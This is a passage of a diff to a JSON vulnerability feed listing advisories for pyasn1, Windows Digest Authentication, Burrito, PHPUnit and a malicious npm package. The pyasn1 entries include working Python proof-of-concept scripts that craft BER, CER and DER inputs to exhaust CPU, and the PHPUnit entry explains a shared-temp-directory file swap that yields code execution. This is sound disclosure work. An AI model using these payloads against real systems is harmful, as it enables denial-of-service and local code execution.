size. The decoder's [eight-octet length-field limit](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.\n\nThe vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.\n\n## Impact\n\nA comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.\n\n## Reproduction and evidence\n\nThe following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.\n\n```python\nimport time\n\nfrom pyasn1.codec.ber import decoder as ber\nfrom pyasn1.codec.cer import decoder as cer\nfrom pyasn1.codec.der import decoder as der\n\n\ndef real_value(mantissa_octets):\n    content = b\"\\x80\\x00\" + b\"\\xff\" * mantissa_octets\n    length = len(content).to_bytes(3, \"big\")\n    return b\"\\x09\\x83\" + length + content\n\n\nfor codec in (ber, cer, der):\n    for size in (50_000, 100_000, 200_000):\n        substrate = real_value(size)\n        started = time.process_time()\n        value, rest = codec.decode(substrate)\n        print(codec.__name__, size, time.process_time() - started)\n        assert not rest\n        assert tuple(value)[1:] == (2, 0)\n```\n\nThe original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.\n\n| Mantissa size | Reporter's BER CPU time |\n| ---: | ---: |\n| 50,000 octets | 0.328 s |\n| 100,000 octets | 1.299 s |\n| 200,000 octets | 6.043 s |\n| 400,000 octets | 24.095 s |\n\nThe same report measured 5.645 s for a 200,000-octet mantissa through DER.\n\nA separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.\n\n## Fix\n\npyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), \"big\")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.\n\n## Workarounds\n\nUpgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume.",
+      "published": "2026-10-30T23:06:46Z",
+      "updated": "2026-10-30T23:06:48Z",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:pyasn1"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-mm57-4v3p-rchx",
+        "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-mm57-4v3p-rchx",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-119197",
+        "https://github.com/pyasn1/pyasn1/pull/132",
+        "https://github.com/pyasn1/pyasn1/commit/ce3ec3390784780a530047e0e77be5ff457636a4",
+        "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00425,
+      "epss_percentile": 0.36798,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "python"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119195",
+      "aliases": [
+        "GHSA-9m75-vc3g-4x39"
+      ],
+      "title": "pyasn1 has quadratic-time denial of service in constructed string and indefinite-length ANY decoding",
+      "description": "## Summary\n\nIn pyasn1 0.6.4 and earlier, decoding a constructed OCTET STRING or character string made of many fragments can spend disproportionate CPU time repeatedly copying the accumulated value. A separate indefinite-length `ANY` path has the same problem while collecting the encoded components. The work grows roughly quadratically with the number of fixed-size fragments, although the input and decoded value grow linearly. An application that lets an attacker supply such ASN.1 input to an affected decoder can suffer CPU exhaustion.\n\nThe affected string paths are available in BER and CER. The DER decoder also accepts certain *non-DER* constructed strings: a definite-length constructed OCTET STRING when an `asn1Spec` selects `univ.OctetString`, and constructed character strings such as UTF8String even without a schema. Indefinite-length `ANY` is affected in BER and CER when an `asn1Spec` selects `univ.Any`; DER rejects indefinite lengths.\n\nThis is a distinct decoder path from the OBJECT IDENTIFIER/RELATIVE-OID accumulation addressed by [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj). It has the same complexity class, but the OID fix in 0.6.4 did not change these string or `ANY` loops.\n\n## Technical details\n\nIn the [v0.6.4 BER decoder](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py), `OctetStringPayloadDecoder` appends each decoded fragment to a growing `bytes` value with `header += component` in both its [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L338-L351) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L368-L387) constructed forms. [`AnyPayloadDecoder.indefLenValueDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1403-L1430) similarly uses `chunk += component`. In the exercised paths, each concatenation copies an increasingly large prefix. For `N` fixed-size fragments, the total copied data grows with `1 + 2 + ... + N`, or O(N²).\n\nThe OCTET STRING decoder is also the base class of the decoders for UTF8String, NumericString, PrintableString, TeletexString, VideotexString, IA5String, GraphicString, VisibleString, GeneralString, UniversalString, BMPString, ObjectDescriptor, GeneralizedTime, and UTCTime. These types inherit the same constructed-string reassembly path.\n\nThe [DER decoder's OCTET STRING restriction](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L49) replaces the tag-driven decoder, but its schema-driven `TYPE_MAP` retains the BER-derived decoder. Thus `der.decode(data)` rejects a constructed OCTET STRING, while `der.decode(data, asn1Spec=univ.OctetString())` accepts its definite-length form and reaches the accumulation loop. DER does not replace the inherited character-string decoders, so a constructed UTF8String is also accepted without `asn1Spec`. These inputs violate [X.690's DER string-encoding rule](https://www.itu.int/rec/T-REC-X.690-202102-I/en) and should not be described as valid DER encodings.\n\nThe original short-fragment, definite-length OCTET STRING reproducer is valid BER. The CER decoder accepts it, but it is not a conforming CER string encoding: X.690 requires an indefinite-length outer constructed string and 1,000 contents octets per fragment except possibly the last. A conforming CER-shaped constructed OCTET STRING with those fragment sizes also reaches the loop and shows quadratic growth. The indefinite-length `ANY` reproducer below can represent a CER `SEQUENCE OF OCTET STRING` and reaches the separate `ANY` loop when decoded with an `ANY` schema.\n\nThe decoder's eight-octet length-field limit and nesting-depth limit do not bound the number of sibling fragments in these examples. The BER reproducer below uses only a three-octet outer length field; all fragments have shallow nesting. There is no per-message fragment-count cap in v0.6.4.\n\n## Impact\n\nIf an application passes attacker-controlled ASN.1 to the affected `decode()` or `StreamingDecoder` path without an adequate input or resource limit, a megabyte-scale value can occupy a decoding worker for seconds. Repeated inputs can exhaust available CPU. Whether this is reachable before authentication, or through a particular protocol, depends on the application; the library finding alone does not establish those conditions. No confidentiality or integrity impact is claimed.\n\n## Severity assessment (CVSS v3.1)\n\nThe 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER inputs trigger the string-reassembly issue without special conditions, privileges, or user interaction. Repeated crafted inputs could occupy all available decoder workers and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not assert that every adopter has such an endpoint or loses all service; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).\n\nOn the official v0.6.4 tag, local CPU-time measurements with CPython 3.14.8 on macOS arm64 gave the following results. Times vary by machine and Python runtime; the input-size scaling is the relevant observation. “Fixed” means the local 0.6.5 decoder fix applied to the same inputs.\n\n| Decoder path and input | Fragments | v0.6.4 CPU | Fixed CPU |\n| --- | ---: | ---: | ---: |\n| BER constructed OCTET STRING, 0.40 MB | 100,000 × 2 payload bytes | 0.340 s | 0.160 s |\n| BER constructed OCTET STRING, 0.80 MB | 200,000 × 2 payload bytes | 0.886 s | 0.312 s |\n| BER constructed OCTET STRING, 1.60 MB | 400,000 × 2 payload bytes | 2.738 s | 0.623 s |\n| BER indefinite `ANY`, 0.30 MB | 100,000 × 1 payload byte | 0.459 s | 0.206 s |\n| BER indefinite `ANY`, 0.60 MB | 200,000 × 1 payload byte | 1.245 s | 0.412 s |\n| BER indefinite `ANY`, 1.20 MB | 400,000 × 1 payload byte | 3.980 s | 0.826 s |\n| CER constructed OCTET STRING, 1.00 MB, conforming fragment layout | 1,000 × 1,000 payload bytes | 0.0089 s | 0.0022 s |\n| CER constructed OCTET STRING, 2.01 MB, conforming fragment layout | 2,000 × 1,000 payload bytes | 0.0311 s | 0.0044 s |\n| CER constructed OCTET STRING, 4.02 MB, conforming fragment layout | 4,000 × 1,000 payload bytes | 0.1379 s | 0.0090 s |\n\nFor the same short-fragment layout, the original report measured up to 16.05 seconds for a 3.2 MB BER constructed OCTET STRING. An independent report on CPython 3.11.16/Linux measured 5.76 seconds for a 2.4 MB constructed OCTET STRING, versus about 0.005 seconds for a primitive OCTET STRING of comparable size. These are reporter measurements on different systems, not fixed performance guarantees.\n\n## Reproduction\n\nThis example uses public decoder APIs. Run it with pyasn1 0.6.4 and increase `n` to observe the scaling. The final two calls show the DER paths accepted by v0.6.4; their constructed encodings are not valid DER.\n\n```python\nimport time\n\nfrom pyasn1.codec.ber import decoder as ber\nfrom pyasn1.codec.cer import decoder as cer\nfrom pyasn1.codec.der import decoder as der\nfrom pyasn1.type import univ\n\n\ndef tlv(identifier, contents):\n    length = len(contents)\n    if length < 128:\n        return bytes((identifier, length)) + contents\n    encoded = length.to_bytes((length.bit_length() + 7) // 8, \"big\")\n    return bytes((identifier, 0x80 | len(encoded))) + encoded + contents\n\n\ndef measure(label, decode, substrate, asn1Spec=None):\n    start = time.process_time()\n    _, rest = decode(substrate, asn1Spec=asn1Spec)\n    assert not rest\n    print(f\"{label}: {len(substrate)} input bytes, \"\n          f\"{time.process_time() - start:.3f} CPU seconds\")\n\n\nn = 100_000\noctet_fragments = b\"\\x04\\x02AA\" * n\nutf8_fragments = b\"\\x0c\\x02AA\" * n\n\nmeasure(\"BER constructed OCTET STRING\", ber.decode,\n        tlv(0x24, octet_fragments))\nmeasure(\"BER indefinite ANY\", ber.decode,\n        b\"\\x30\\x80\" + b\"\\x04\\x01A\" * n + b\"\\x00\\x00\",\n        univ.Any())\n\n# CER uses indefinite length and 1,000-content-octet primitive fragments.\ncer_fragment = tlv(0x04, b\"A\" * 1000)\nmeasure(\"CER constructed OCTET STRING\", cer.decode,\n        b\"\\x24\\x80\" + cer_fragment * 1000 + b\"\\x00\\x00\")\n\n# These constructed encodings are accepted by pyasn1 but are invalid DER.\nmeasure(\"DER OCTET STRING with schema\", der.decode,\n        tlv(0x24, octet_fragments), univ.OctetString())\nmeasure(\"DER UTF8String without schema\", der.decode,\n        tlv(0x2c, utf8_fragments))\n```\n\n## Patch\n\npyasn1 0.6.5 replaces the growing `bytes` accumulator with a list of fragments and joins them once after decoding in all three affected loops. The OCTET STRING base-class change also covers the inheriting character-string decoders. This removes the repeated copying while preserving the assembled decoded value.\n\n## Workaround\n\nUntil upgrading, enforce application-appropriate limits on the size of untrusted ASN.1 input *before* passing it to pyasn1, and limit the CPU resources available to decoding workers. Applications that require DER can also reject constructed string encodings before invoking the decoder. The appropriate byte limit depends on the protocol and expected valid values.\n\n## Credits and references\n\nReported by [alimony](https://github.com/alimony). Independently reported by [manus-pi](https://github.com/manus-pi), whose report identified the schema-driven DER route, inherited character-string decoders, and additional performance evidence.\n\n- [pyasn1 v0.6.4 affected decoder source](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py)\n- [ITU-T X.690, CER and DER string-encoding rules](https://www.itu.int/rec/T-REC-X.690-202102-I/en)\n- [CVE-2026-59885, separate OID decoder issue](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj)",
+      "published": "2026-10-30T23:03:51Z",
+      "updated": "2026-10-30T23:03:54Z",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:pyasn1"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-9m75-vc3g-4x39",
+        "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-9m75-vc3g-4x39",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-119195",
+        "https://github.com/pyasn1/pyasn1/pull/132",
+        "https://github.com/pyasn1/pyasn1/commit/4ce00797c594b59c1fd6b86d9ebc3ba87b7ec9f9",
+        "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00527,
+      "epss_percentile": 0.44611,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "python"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119194",
+      "aliases": [
+        "GHSA-fm9c-5rcf-2q5p"
+      ],
+      "title": "pyasn1 has quadratic CPU use in schemaless BER/CER/DER container decoding",
+      "description": "### Summary\n\nWhen an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.\n\n### Details\n\nConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.\n\n### Proof of concept\n\nRun this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:\n\n```python\nimport sys\nimport time\n\nfrom pyasn1.codec.ber import decoder\nfrom pyasn1.type import univ\n\n\ndef enc_tag(tag_id):\n    groups = [tag_id & 0x7f]\n    tag_id >>= 7\n    while tag_id:\n        groups.append((tag_id & 0x7f) | 0x80)\n        tag_id >>= 7\n    return b'\\xbf' + bytes(reversed(groups))\n\n\ndef payload(tag_ids):\n    body = b''.join(enc_tag(tag_id) + b'\\x03\\x04\\x01A'\n                    for tag_id in tag_ids)\n    length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')\n    return b'\\x30' + bytes([0x80 | len(length)]) + length + body\n\n\nfor count in (3200, 6400):\n    cases = (\n        (\"collision\", [32 + i * sys.hash_info.modulus\n                       for i in range(count)]),\n        (\"control\", [(1 << 70) + i for i in range(count)]),\n    )\n    for name, tag_ids in cases:\n        wire = payload(tag_ids)\n        start = time.process_time()\n        value, remainder = decoder.decode(wire)\n        cpu_seconds = time.process_time() - start\n\n        assert type(value) is univ.Sequence\n        assert len(value) == count and remainder == b''\n        for position, tag_id in enumerate(tag_ids):\n            component = value.getComponentByPosition(position)\n            assert component.asOctets() == b'A'\n            assert component.tagSet[-1].tagId == tag_id\n\n        print(count, name, len(wire), round(cpu_seconds, 3))\n```\n\n### Impact\n\nApplications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.",
+      "published": "2026-10-30T23:03:37Z",
+      "updated": "2026-10-30T23:03:39Z",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:pyasn1"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-fm9c-5rcf-2q5p",
+        "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-fm9c-5rcf-2q5p",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-119194",
+        "https://github.com/pyasn1/pyasn1/pull/132",
+        "https://github.com/pyasn1/pyasn1/commit/a36e3a3d067148d26197a6b7221fd0e2cde9cc86",
+        "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00425,
+      "epss_percentile": 0.36799,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "python"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-106174",
       "aliases": [],
       "title": "",
@@ -44386,6 +44732,65 @@
         "popularity": 21.0,
         "cvss": 15.0,
         "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-88158",
+      "aliases": [],
+      "title": "",
+      "description": "Out-of-bounds read in Microsoft Digest Authentication allows an authorized attacker to disclose information locally.",
+      "published": "2026-10-13T19:21:36.023",
+      "updated": "2026-10-31T00:25:18.947",
+      "cvss": 5.5,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-88158"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00294,
+      "epss_percentile": 0.22035,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 41.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 11.0,
+        "epss": 0.0
       },
       "ai_analysis": ""
     },
@@ -46728,9 +47133,9 @@
       "id": "GHSA-9j83-qj34-g5vc",
       "aliases": [],
       "title": "Malware in @factiii/runner",
-      "description": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n\n週間ダウンロード数: 約 2,123",
+      "description": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n\n週間ダウンロード数: 約 2,326",
       "published": "2026-10-22T21:37:36Z",
-      "updated": "2026-10-29T00:13:36Z",
+      "updated": "2026-10-31T02:20:37Z",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
@@ -49728,6 +50133,54 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-102649",
+      "aliases": [],
+      "title": "",
+      "description": "Burrito is a Terraform Automation Collaboration Software (TACoS) Kubernetes operator. Prior to 0.13.0, `POST /api/webhook` accepts unsigned GitHub and GitLab events when a `TerraformRepository`'s credentials omit `webhookSecret` or set it to an empty value, including credentials configured for git authentication and polling. `Credential.WebhookSecret` is optional, and `go-playground/webhooks` skips signature or token verification when the secret is empty. Anyone who can reach `burrito-server`'s endpoint and knows a tracked repository's URL can forge events to create or delete `TerraformPullRequest` custom resources with attacker-chosen `Branch`, `Base`, and `ID` fields. For GitHub `pull_request` events, the controller fetches changed files using the real pull request number but does not cross-check the payload's branch against that pull request. Pairing a real, existing pull request number with an unrelated existing branch in the same repository can therefore cause an unauthorized `terraform plan` for affected layers using the operator's stored git and cloud credentials. Code analysis also indicates that the resulting plan can be posted to the real pull request's comment thread, exposing and misattributing another branch's infrastructure changes. Auto-apply is disabled for these temporary layers, so this vulnerability alone cannot force a `terraform apply`; plan-time provider and data-source code execution depends on the selected branch's contents. This issue is fixed in version 0.13.0.",
+      "published": "2026-10-26T18:17:21.803",
+      "updated": "2026-10-31T02:17:29.003",
+      "cvss": 9.9,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H",
+      "severity": "critical",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/padok-team/burrito/commit/1d48432a4a0126429c99f5fa42567bf3711d1ca1",
+        "https://github.com/padok-team/burrito/releases/tag/v0.13.0",
+        "https://github.com/padok-team/burrito/security/advisories/GHSA-7m68-72r6-3jx8",
+        "https://github.com/padok-team/burrito/security/advisories/GHSA-7m68-72r6-3jx8"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00458,
+      "epss_percentile": 0.39703,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "kubernetes"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 38.9,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 19.8,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-116070",
       "aliases": [],
       "title": "Docker-Proxy through 5.1.9 Missing Authentication via hubcmdui /api/config",
@@ -49774,52 +50227,6 @@
       "score_breakdown": {
         "popularity": 20,
         "cvss": 13.8,
-        "unauth_network": 5
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-102649",
-      "aliases": [],
-      "title": "",
-      "description": "Burrito is a Terraform Automation Collaboration Software (TACoS) Kubernetes operator. Prior to 0.13.0, `POST /api/webhook` accepts unsigned GitHub and GitLab events when a `TerraformRepository`'s credentials omit `webhookSecret` or set it to an empty value, including credentials configured for git authentication and polling. `Credential.WebhookSecret` is optional, and `go-playground/webhooks` skips signature or token verification when the secret is empty. Anyone who can reach `burrito-server`'s endpoint and knows a tracked repository's URL can forge events to create or delete `TerraformPullRequest` custom resources with attacker-chosen `Branch`, `Base`, and `ID` fields. For GitHub `pull_request` events, the controller fetches changed files using the real pull request number but does not cross-check the payload's branch against that pull request. Pairing a real, existing pull request number with an unrelated existing branch in the same repository can therefore cause an unauthorized `terraform plan` for affected layers using the operator's stored git and cloud credentials. Code analysis also indicates that the resulting plan can be posted to the real pull request's comment thread, exposing and misattributing another branch's infrastructure changes. Auto-apply is disabled for these temporary layers, so this vulnerability alone cannot force a `terraform apply`; plan-time provider and data-source code execution depends on the selected branch's contents. This issue is fixed in version 0.13.0.",
-      "published": "2026-10-26T18:17:21.803",
-      "updated": "2026-10-26T18:39:42.503",
-      "cvss": 9.9,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H",
-      "severity": "critical",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://github.com/padok-team/burrito/commit/1d48432a4a0126429c99f5fa42567bf3711d1ca1",
-        "https://github.com/padok-team/burrito/releases/tag/v0.13.0",
-        "https://github.com/padok-team/burrito/security/advisories/GHSA-7m68-72r6-3jx8"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-26T19:59:36.444930+00:00",
-      "matched": [
-        "kubernetes"
-      ],
-      "match_type": "keyword",
-      "tier": 2,
-      "score": 38.8,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 14.0,
-        "cvss": 19.8,
         "unauth_network": 5
       },
       "ai_analysis": ""
@@ -51874,6 +52281,60 @@
         "popularity": 20,
         "cvss": 11.8,
         "unauth_network": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119193",
+      "aliases": [
+        "GHSA-9vw2-f4vp-x7gf"
+      ],
+      "title": "PHPUnit vulnerable to code execution by other local users via shared temporary directory in PHPT code coverage handling",
+      "description": "### Summary\n\nWhen PHPT tests are run with code coverage, PHPUnit 13.4.0 to 13.4.3 writes the code of each PHPT test to a directory with a fixed name below the operating system's path used for temporary files, for instance `/tmp/phpunit-phpt` on Linux, and executes it from there. PHPUnit uses this directory even when it was created by another user.\n\nOn a system where the path used for temporary files is shared between users, another local user can create this directory before the developer runs PHPUnit, replace the code of a PHPT test before it is executed, and thereby execute arbitrary code with the privileges of the developer. The test still passes and the code coverage report is complete, so the attack is not visible.\n\nThe impact is full code execution as the user who runs PHPUnit. The likelihood is low: the attacker needs an account on the same system and must create the directory before the developer runs PHPT tests with code coverage. macOS and Windows use per-user temporary directories by default and are not affected in their default configuration. PHPUnit 12.5 and earlier are not affected.\n\n### Details\n\nWhen code coverage is collected for a PHPT test, PHPUnit writes two temporary files: a `.php` file with the code of the PHPT test (the \"job\" file), which the child process executes, and a `.coverage` file, to which the child process writes the code coverage data it collected.\n\nSince PHPUnit 13.4.0, these files are created in a directory with a fixed name:\n\n* [`TestCase::coverageFilesDirectory()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L132-L143) returns `sys_get_temp_dir() . '/phpunit-phpt'`\n* The [constructor](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L169-L174) names the files `phpunit_phpt_<random>.php` and `phpunit_phpt_<random>.coverage` in this directory\n\nBefore a PHPT test is run with code coverage, this directory is [created using `Filesystem::createDirectory()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L319). [`Filesystem::createDirectory()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Util/Filesystem.php#L27-L30) returns `true` when the directory already exists, without checking its owner or its permissions. When it does not exist, it is created with mode `0777` (subject to the umask).\n\n[`Renderer::renderForCoverage()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/Renderer.php#L112) then writes the job file using `file_put_contents()`. The child process loads Composer's autoloader, the bootstrap script, and the code coverage driver, and then [executes the job file using `require`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/templates/phpt.tpl#L43).\n\nWhen another user created the directory, that user owns it. The owner of a directory can list its contents and rename, delete, or replace every file in it, regardless of who owns the file. The directory does not have the sticky bit set, so protections such as Linux's `fs.protected_regular` and `fs.protected_symlinks` do not apply either. The random part of the file names therefore does not prevent the attack: the attacker waits for the job file to appear, renames it, and puts a file with their own code in its place. The attacker's code can then execute the original job file, so that the test passes and the code coverage report is complete.\n\nThe `.coverage` file can be replaced in the same way. [`TestCase::cleanupForCoverage()`](https://github.com/sebastianbergmann/phpunit/blob/13.4.3/src/Runner/Phpt/TestCase.php#L760-L803) only allows objects of PHPUnit's class for raw code coverage data to be unserialized from it, so this only allows the falsification of code coverage 